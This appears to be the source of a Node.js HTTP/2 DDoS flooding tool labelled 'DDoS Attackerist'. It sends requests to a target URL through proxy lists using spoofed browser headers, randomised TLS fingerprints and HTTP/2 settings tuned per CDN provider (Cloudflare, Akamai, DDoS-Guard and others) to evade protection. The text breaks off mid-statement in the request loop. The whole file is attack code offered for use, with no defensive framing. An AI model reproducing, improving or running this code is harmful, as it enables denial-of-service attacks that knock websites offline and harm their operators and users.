//DDoS Attackerist
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require("dns");
const util = require("util");
const socks = require("socks");
const crypto = require("crypto");
const HPACK = require("hpack");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers =
  "GREASE:" +
  [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3),
  ].join(":");

async function getFetch() {
  return (await import("node-fetch")).default;
}

function encodeSettings(settings) {
  const data = Buffer.alloc(6 * settings.length);
  settings.forEach(([id, value], i) => {
    data.writeUInt16BE(id, i * 6);
    data.writeUInt32BE(value, i * 6 + 2);
  });
  return data;
}
const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};
const spoofed = ip_spoof();
const urihost = [
  "google.com",
  "youtube.com",
  "facebook.com",
  "baidu.com",
  "wikipedia.org",
  "x.com",
  "amazon.com",
  "yahoo.com",
  "reddit.com",
  "bing.com",
  "duckduckgo.com",
  "netflix.com",
];
clength = urihost[Math.floor(Math.random() * urihost.length)];
const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256",
];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "ecdsa_secp521r1_sha512",
  "rsa_pss_rsae_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_rsae_sha384",
  "rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha512",
  "rsa_pkcs1_sha512",
];
let SignalsList = sigalgs.join(":");
function encodeFrame(streamId, type, payload = "", flags = 0) {
  const frame = Buffer.alloc(9 + payload.length);
  frame.writeUInt32BE((payload.length << 8) | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0) frame.set(payload, 9);
  return frame;
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}
function randstr(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
function generateRandomString(minLength, maxLength) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const length =
    Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });
  return randomStringArray.join("");
}
function randnum(minLength, maxLength) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const length =
    Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from(
    {
      length,
    },
    () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    },
  );
  return randomStringArray.join("");
}

(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
  "TimeoutError",
  "JSONError",
  "URLError",
  "InvalidURL",
  "ProxyError",
]),
  (ignoreCodes = [
    "SELF_SIGNED_CERT_IN_CHAIN",
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
    "EAI_AGAIN",
    "EHOSTDOWN",
    "ENETRESET",
    "ENETUNREACH",
    "ENONET",
    "ENOTCONN",
    "ENOTFOUND",
    "EAI_NODATA",
    "EAI_NONAME",
    "EADDRNOTAVAIL",
    "EAFNOSUPPORT",
    "EALREADY",
    "EBADF",
    "ECONNABORTED",
    "EDESTADDRREQ",
    "EDQUOT",
    "EFAULT",
    "EHOSTUNREACH",
    "EIDRM",
    "EILSEQ",
    "EINPROGRESS",
    "EINTR",
    "EINVAL",
    "EIO",
    "EISCONN",
    "EMFILE",
    "EMLINK",
    "EMSGSIZE",
    "ENAMETOOLONG",
    "ENETDOWN",
    "ENOBUFS",
    "ENODEV",
    "ENOENT",
    "ENOMEM",
    "ENOPROTOOPT",
    "ENOSPC",
    "ENOSYS",
    "ENOTDIR",
    "ENOTEMPTY",
    "ENOTSOCK",
    "EOPNOTSUPP",
    "EPERM",
    "EPIPE",
    "EPROTONOSUPPORT",
    "ERANGE",
    "EROFS",
    "ESHUTDOWN",
    "ESPIPE",
    "ESRCH",
    "ETIME",
    "ETXTBSY",
    "EXDEV",
    "UNKNOWN",
    "DEPTH_ZERO_SELF_SIGNED_CERT",
    "UNABLE_TO_VERIFY_LEAF_SIGNATURE",
    "CERT_HAS_EXPIRED",
    "CERT_NOT_YET_VALID",
  ]);
process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return !1;
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return !1;
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return !1;
  })
  .setMaxListeners(0);
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.SSL_OP_NO_TLSv1_3 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if (process.argv.length < 7) {
  console.log(
    `Usage: \n` +
      "NODE h2 ".green +
      "[TARGET] ".red +
      "[TIME] ".red +
      "[RATE] ".red +
      "[THREAD] ".red +
      "[PROXY] ".red +
      "\n" +
      "[Example] : ".green +
      "node h2 https://google.com/ 120 64 4 proxy.txt".red,
  );
  process.exit();
}
const secureProtocol = ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"];
const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: SignalsList,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol,
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3], 10),
  Rate: parseInt(process.argv[4], 10),
  threads: parseInt(process.argv[5], 10),
  proxyFile: process.argv[6],
};

const proxies = readLines(args.proxyFile); // Assuming readLines is a function that reads the file line by line.
const parsedTarget = url.parse(args.target);

// Refactor the NetSocket class with reusable logic
class NetSocket {
  constructor() {}

  // Helper method to parse the address
  static parseAddress(address) {
    return address.split(":");
  }

  // SOCKS5 method
  async SOCKS5(options, callback) {
    const [host, port] = NetSocket.parseAddress(options.address);
    socks.createConnection(
      {
        proxy: {
          host: options.host,
          port: options.port,
          type: 5,
        },
        command: "connect",
        destination: {
          host,
          port: parseInt(port, 10),
        },
      },
      (error, info) => {
        if (error) {
          return callback(undefined, error);
        }
        return callback(info.socket, undefined);
      },
    );
  }

  // HTTP method (proxy connection)
  HTTP(options, callback) {
    const [host, port] = NetSocket.parseAddress(options.address);
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", (chunk) => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (!isAlive) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", (err) => {
      connection.destroy();
      return callback(undefined, `error: ${err.message}`);
    });
  }
}
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date("2025-03-30");
if (currentDate > targetDate) {
  console.error("Error method has been outdated");
  process.exit(1);
}
const Socker = new NetSocket();
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
  try {
    const fetch = await getFetch();
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;

    const response = await fetch(apiUrl);

    // Check if response is not ok and log the error
    if (!response.ok) {
      console.error(
        `Failed to fetch ISP data for ${url}, Status: ${response.status}`,
      );
      return;
    }

    const data = await response.json();
    const isp = data.isp;
    //console.log(`TARGET: ${url}: ${isp}`);
  } catch (error) {
    console.error(`Error fetching ISP data for ${url}:`, error);
  }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
  const min = 1000;
  const max = 6222;
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
if (cluster.isMaster) {
  console.clear();
  console.log(`[HTTP/2]`.bgRed);
  console.log(`----------------------------------------------`.gray);
  console.log(`[TARGET]: `.red + `${process.argv[2]}`.green);
  console.log(`[~~TIME]: `.red + `${process.argv[3]}`.green);
  console.log(`[~~RATE]: `.red + `${process.argv[4]}`.green);
  console.log(`[THREAD]: `.red + `${process.argv[5]}`.green);
  console.log(`[~PROXY]: `.red + `${process.argv[6]}`.green);
  console.log(`----------------------------------------------`.gray);

  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }

    console.log("[>] Restarting the script", RESTART_DELAY, "ms...");
    setTimeout(() => {
      for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
      }
    }, RESTART_DELAY);
  };

  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;

    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log("[!] Maximum RAM usage:", ramPercentage.toFixed(2), "%");
      restartScript();
    }
  };

  setInterval(handleRAMUsage, 5000);

  for (let counter = 1; counter <= args.threads; counter++) {
    const heapSize = getRandomHeapSize();
    cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
  }
} else {
  setInterval(runFlooder, 1);
}
function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  function h2body() {
    const h2body2 = {};

    // Random number generator utility
    const getRandomNumber = (min, max) =>
      Math.floor(Math.random() * (max - min + 1)) + min;

    // Generate random key-value pairs based on a random number of iterations
    const maxi = getRandomNumber(2, 3);

    // Create random key-value pairs and add to the object
    for (let i = 0; i < maxi; i++) {
      const key = "cf-sec-" + generateRandomString(1, 9);
      const value =
        generateRandomString(1, 10) +
        "-" +
        generateRandomString(1, 12) +
        "=" +
        generateRandomString(1, 12);
      h2body2[key] = value;
    }

    return h2body2;
  }
  const browsers = [
    "chrome", "duckduckgo", "safari", "brave", "firefox", "mobile", "opera", "operagx", "edge", "yandex"
  ];
  
  // Random index generator
  const getRandomIndex = (max) => Math.floor(Math.random() * max);
  
  // Randomly select a browser
  const getRandomBrowser = () => browsers[getRandomIndex(browsers.length)];
  
  // Randomly select a host (with or without "www" and subdomain)
  const getRandomHost = (parsedTarget) => {
    const isWithSubdomain = getRandomIndex(2) === 0;
    const isWithDot = getRandomIndex(2) === 0;
    return `${isWithSubdomain ? "www." : ""}${parsedTarget.host}${isWithDot ? "." : ""}`;
  };
  
  // Browser version ranges
  const browserVersions = {
    chrome: { min: 120, max: 124 },
    duckduckgo: { min: 12, max: 16 },
    safari: { min: 12, max: 16 },
    brave: { min: 120, max: 124 },
    firefox: { min: 99, max: 132 },
    mobile: { min: 85, max: 105 },
    opera: { min: 70, max: 90 },
    operagx: { min: 70, max: 90 },
    edge: { min: 120, max: 124 },
    yandex: { min: 21, max: 23 }
  };
  
  // Get a random version for a browser
  const getVersion = (browser) => {
    const { min, max } = browserVersions[browser];
    return getRandomIndex(max - min + 1) + min;
  };
  
  // Full version per browser
  const fullVersions = {
    brave: "1.71.118",
    duckduckgo: "91.0",
    chrome: "132.0.6834.15",
    firefox: "132.0",
    safari: "17.4",
    mobile: "125.0.6775.55",
    opera: "114.0.5282.102",
    operagx: "114.0.5282.123",
    edge: "118.0.5993.118",
    yandex: "23.7.3.106"
  };
  
  const getFullVersion = (browser) => fullVersions[browser];
  
  // Generate Sec-CH-UA Full Version List
  const getSecChUAFullVersionList = () => Object.entries(fullVersions)
    .map(([key, version]) => `"${key}";v="${version}"`)
    .join(", ");
  
  // Platforms for browsers
  const platforms = {
    chrome: "Windows",
    duckduckgo: "macOS",
    safari: "macOS",
    brave: "Linux",
    firefox: "Linux",
    mobile: "Android",
    opera: "Linux",
    operagx: "Linux",
    edge: "Windows",
    yandex: "Windows"
  };
  
  const getPlatform = (browser) => platforms[browser];
  
  // User-Agent Templates
  const userAgentTemplates = {
    chrome: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    duckduckgo: (version) => `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} DuckDuckGo/7 Safari/605.1.15`,
    safari: (version) => `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
    brave: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    firefox: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
    mobile: (version) => `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
    opera: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    operagx: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    edge: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/${version}.0.0.0 Safari/537.36`,
    yandex: (version) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Yandex/${version}.0.0.0 Safari/537.36`
  };
  
  const getUserAgent = (browser, version) => userAgentTemplates[browser](version);
  
  // Generate dynamic headers
  const generateHeaders = (browser, parsedTarget) => {
    const version = getVersion(browser);
    const fullVersion = getFullVersion(browser);
    const secChUAFullVersionList = getSecChUAFullVersionList();
    const platform = getPlatform(browser);
    const userAgent = getUserAgent(browser, version);
    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = "gzip, deflate, br, zstd";
    const Methods = [
      "GET",
      "POST",
      //"HEAD",
      //"PUT",
      //"DELETE",
      //"CONNECT",
      //"OPTIONS",
      //"TRACE",
      //"PATCH",
    ];
    const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
    const acceptHeader = [
      "application/json",
      "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    ][getRandomIndex(3)];
  
    const secFetchDest = ["document", "image", "script", "video"][getRandomIndex(4)];
    const secFetchMode = ["cors", "navigate", "same-origin"][getRandomIndex(3)];
    const secFetchSite = ["same-origin", "cross-site", "same-site"][getRandomIndex(3)];
  
    return {
      ":authority": getRandomHost(parsedTarget),
      ":method": randomMethod,
      ":path": parsedTarget.path,
      ":scheme": "https",
      Accept: acceptHeader,
      "Accept-Encoding": acceptEncoding,
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control": "no-cache",
      DNT: "1",
      Host: parsedTarget.host,
      Pragma: "no-cache",
      Origin: "https://" + getRandomHost(parsedTarget),
      //Referer: parsedTarget.host + parsedTarget.path + "?__cf_chl_tk=" + randstr(8) + "_" + randstr(34) + "-" + timestampString + "-1.0.1.1-" + randstr(14) + "_" + randstr(28),
      //"Cookie": `cf_clearance=${randstr(32)}_${randstr(11)}-${timestampString}-1.2.1.1-${randstr(172)}_${randstr(13)}_${randstr(32)}_${randstr(45)}${randstr(40)}; XSRF-TOKEN=${randstr(509)}%3D; laravel_session=${randstr(512)}`,
      "Sec-Ch-Ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
      "Sec-Ch-Ua-Mobile": secChUaMobile,
      "Sec-Ch-Ua-Platform": platform,
      "Sec-Fetch-Dest": secFetchDest,
      "Sec-Fetch-Mode": secFetchMode,
      "Sec-Fetch-Site": secFetchSite,
      "Sec-Fetch-User": "?1",
      "Sec-Gpc": "1",
      TE: "trailers",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent": userAgent,
      //"Sec-CH-UA-Full-Version-List": secChUAFullVersionList
    };
  };
  
  const browser = getRandomBrowser();
  const headers = generateHeaders(browser, parsedTarget);
  //console.log(headers);
  //Referer: parsedTarget.host + parsedTarget.path + "?__cf_chl_tk=" + randstr(8) + "_" + randstr(34) + "-" + timestampString + "-1.0.1.1-" + randstr(14) + "_" + randstr(28),
  function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
  }
  const acceptHeader2 = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  ][getRandomIndex(3)];
  const randomString = randstr(10);
  const rateHeaders1 = [
    { "X-Forwarded-For": parsedProxy[0] },
    { "source-ip": randstr(5) },
    { Vary: randstr(5) },
    { "Attribution-Reporting-Eligible": "trigger" },
    { "viewport-width": "1920" },
    { "device-memory": "0.25" },
    { Forward: "for=" + parsedProxy[0] + ";proto=https;by=" + parsedProxy[0] },
  ];
  const rateHeaders2 = [
    { "viewport-width": "1920" },
    { "device-memory": "0.25" },
    { Forward: "for=" + parsedProxy[0] + ";proto=https;by=" + parsedProxy[0] },
    //{ "cookie": randstr(5) + "=" + randstr(5) },
  ];
  const rateHeaders3 = [
    { "A-IM": "Feed" },
    { DNT: "1" },
    {
      "content-security-policy-report-only":
        "report-uri https://reporting.go-mpulse.net/report/FDSGP-LEB9B-T8Y2A-5V5ED-9WX2T",
    },
  ];
  const rateHeaders4 = [
    { "Service-Worker-Navigation-Preload": "true" },
    { "Supports-Loading-Mode": "credentialed-prerender" },
    { Pragma: "no-cache" },
    { "Data-Return": "false" },
  ];
  const rhd = [
    { Worker: Math.random() < 0.5 ? "true" : "null" },
    {
      "service-worker-navigation-preload":
        Math.random() < 0.5 ? "true" : "null",
    },
    { "expect-ct": "enforce" },
    //{undefined}
  ];
  const rhd2 = [
    { "Accept-Patch": acceptHeader2 },
    { "Accept-Ranges": Math.random() < 0.5 ? "bytes" : "none" },
    //{undefined}
  ];
  const hd1 = [
    { "Accept-Range": Math.random() < 0.5 ? "bytes" : "none" },
    { "Delta-Base": "12340001" },
    { TE: "trailers" },
  ];
  const headers4 = {
    ...(Math.random() < 0.5
      ? { "akamai-grn": "0.14965468.1718719936.1009b53" }
      : {}),

    ...(Math.random() < 0.5 ? { "x-akam-sw-version": "0.5.0" } : {}),
    ...(Math.random() < 0.5
      ? { "x-akamai-transformed": "9 - 0 pmb=mNONE,1mTOE,1mRUM,4" }
      : {}),
    ...(getWeightedRandom() &&
      Math.random() < 0.4 && {
        "x-forwarded-for": `${randomString}:${randomString}`,
      }),
    ...(Math.random() < 0.75 ? { referer: "https://" + clength } : {}),
    ...(Math.random() < 0.75
      ? {
          Origin:
            Math.random() < 0.5
              ? "https://" +
                clength +
                (Math.random() < 0.5 ? ":" + randnum(4) + "/" : "@root/")
              : "https://" +
                (Math.random() < 0.5 ? "root-admin." : "root-root.") +
                clength,
        }
      : {}),
  };

  let allHeaders = Object.assign({}, headers, headers4);
  (dyn = {
    ...(Math.random() < 0.5 ? { "cf-mitigated": "challenge" } : {}),
    ...(Math.random() < 0.5 ? { "origin-agent-cluster": "?1" } : {}),
    ...(Math.random() < 0.5 ? { "Observe-Browsing-Topics": "?1" } : {}),
    ...(Math.random() < 0.5
      ? {
          ["client-x-with-" + generateRandomString(1, 9)]:
            generateRandomString(1, 10) +
            "-" +
            generateRandomString(1, 12) +
            "=" +
            generateRandomString(1, 12),
        }
      : {}),
    ...(Math.random() < 0.5
      ? {
          ["cf-sec-with-from-" + generateRandomString(1, 9)]:
            generateRandomString(1, 10) +
            "-" +
            generateRandomString(1, 12) +
            "=" +
            generateRandomString(1, 12),
        }
      : {}),
    ...(Math.random() < 0.5
      ? {
          ["user-x-with-" + generateRandomString(1, 9)]:
            generateRandomString(1, 10) +
            "-" +
            generateRandomString(1, 12) +
            "=" +
            generateRandomString(1, 12),
        }
      : {}),
    ["nodejs-c-python-" + generateRandomString(1, 9)]:
      generateRandomString(1, 10) +
      "-" +
      generateRandomString(1, 12) +
      "=" +
      generateRandomString(1, 12),
  }),
    (dyn2 = {
      ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
      ...(Math.random() < 0.5 ? { purpose: "prefetch" } : {}),
    });
  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10,
  };
  Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);
    const settings = {
      initialWindowSize: 15663105,
    };
    const tlsOptions = {
      ALPNProtocols: ["h2", "http/1.1"],
      ciphers: cipper,
      secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
      secure: true,
      requestCert: true,
      sigalgs: sigalgs,
      socket: connection,
      ecdhCurve: ecdhCurve,
      secureContext: secureContext,
      honorCipherOrder: true,
      rejectUnauthorized: true,
      secureOptions: secureOptions,
      host: parsedTarget.host,
      servername: parsedTarget.host,
    };
    const tlsSocket = tls.connect(
      parsedPort,
      parsedTarget.host,
      tlsOptions,
      () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);
      },
    );
    function generateJA3Fingerprint(socket) {
      const cipherInfo = socket.getCipher();
      const supportedVersions = socket.getProtocol();
      if (!cipherInfo) {
        console.error(
          "Cipher info is not available. TLS handshake may not have completed.",
        );
        return null;
      }
      const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
      const md5Hash = crypto.createHash("md5");
      md5Hash.update(ja3String);
      return md5Hash.digest("hex");
    }
    tlsSocket.on("connect", () => {
      const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    function getSettingsBasedOnISP(isp) {
      const defaultSettings = {
        headerTableSize: 65536,
        initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
        maxHeaderListSize: 262144,
        enablePush: false,
        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
        maxFrameSize: 16384,
        enableConnectProtocol: false,
      };
      const settings = { ...defaultSettings };
      switch (isp) {
        case "Cloudflare, Inc.":
          settings.priority = 1;
          settings.headerTableSize = 65536;
          settings.maxConcurrentStreams = 1000;
          settings.initialWindowSize = 6291456;
          settings.maxFrameSize = 16384;
          settings.enableConnectProtocol = false;
          break;
        case "FDCservers.net":
        case "OVH SAS":
        case "VNXCLOUD":
          settings.priority = 1;
          settings.headerTableSize = 4096;
          settings.initialWindowSize = 65536;
          settings.maxFrameSize = 16777215;
          settings.maxConcurrentStreams = 128;
          settings.maxHeaderListSize = 4294967295;
          break;
        case "Akamai Technologies, Inc.":
        case "Akamai International B.V.":
          settings.priority = 1;
          settings.headerTableSize = 65536;
          settings.maxConcurrentStreams = 1000;
          settings.initialWindowSize = 6291456;
          settings.maxFrameSize = 16384;
          settings.maxHeaderListSize = 32768;
          break;
        case "Fastly, Inc.":
        case "Optitrust GmbH":
          settings.priority = 1;
          settings.headerTableSize = 4096;
          settings.initialWindowSize = 65535;
          settings.maxFrameSize = 16384;
          settings.maxConcurrentStreams = 100;
          settings.maxHeaderListSize = 4294967295;
          break;
        case "Ddos-guard LTD":
          settings.priority = 1;
          settings.maxConcurrentStreams = 1;
          settings.initialWindowSize = 65535;
          settings.maxFrameSize = 16777215;
          settings.maxHeaderListSize = 262144;
          break;
        case "Amazon.com, Inc.":
        case "Amazon Technologies Inc.":
          settings.priority = 1;
          settings.maxConcurrentStreams = 100;
          settings.initialWindowSize = 65535;
          settings.maxHeaderListSize = 262144;
          break;
        case "Microsoft Corporation":
        case "Vietnam Posts and Telecommunications Group":
        case "VIETNIX":
          settings.priority = 1;
          settings.headerTableSize = 4096;
          settings.initialWindowSize = 8388608;
          settings.maxFrameSize = 16384;
          settings.maxConcurrentStreams = 100;
          settings.maxHeaderListSize = 4294967295;
          break;
        case "Google LLC":
          settings.priority = 1;
          settings.headerTableSize = 4096;
          settings.initialWindowSize = 1048576;
          settings.maxFrameSize = 16384;
          settings.maxConcurrentStreams = 100;
          settings.maxHeaderListSize = 137216;
          break;
        default:
          settings.headerTableSize = 65535;
          settings.maxConcurrentStreams = 1000;
          settings.initialWindowSize = 6291456;
          settings.maxHeaderListSize = 261144;
          settings.maxFrameSize = 16384;
          break;
      }

      return settings;
    }

    let hpack = new HPACK();
    let client;

    const clients = [];
    client = http2.connect(parsedTarget.href, {
      protocol: "https",
      createConnection: () => tlsSocket,
      settings: getSettingsBasedOnISP(isp),
      socket: tlsSocket,
    });
    clients.push(client);
    client.setMaxListeners(0);

    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(
      Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105,
      0,
    );
    client.on("remoteSettings", (settings) => {
      const localWindowSize =
        Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
      client.setLocalWindowSize(localWindowSize, 0);
    });

    client.on("connect", () => {
      client.ping((err, duration, payload) => {});

      client.goaway(
        0,
        http2.constants.NGHTTP2_HTTP_1_1_REQUIRED,
        Buffer.from("NATRAL"),
      );
    });
    clients.forEach((client) => {
      const intervalId = setInterval(() => {
        async function sendRequests() {
          const shuffleObject = (obj) => {
            const keys = Object.keys(obj);
            for (let i = keys.length - 1; i > 0; i--) {
              const j = Math.floor(Math.random() * (i + 1));
              [keys[i], keys[j]] = [keys[j], keys[i]];
            }
            const shuffledObj = {};
            keys.forEach((key) => (shuffledObj[key] = obj[key]));
            return shuffledObj;
          };
          const randomItem = (array) =>
            array[Math.floor(Math.random() * array.length)];
          const dynHeaders = shuffleObject({
            ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
            ...(Math.random() < 0.5 && { rhd2: [randomItem(rhd2)] }),
            ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
            ...randomItem(rateHeaders1),
            ...randomItem(rateHeaders2),
            ...randomItem(rateHeaders3),
            ...randomItem(rateHeaders4),
            ...dyn,
            ...allHeaders,
            ...dyn2,
            ...(Math.random() < 0.5 ? h2body() : {}),
          });

          const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xff]),
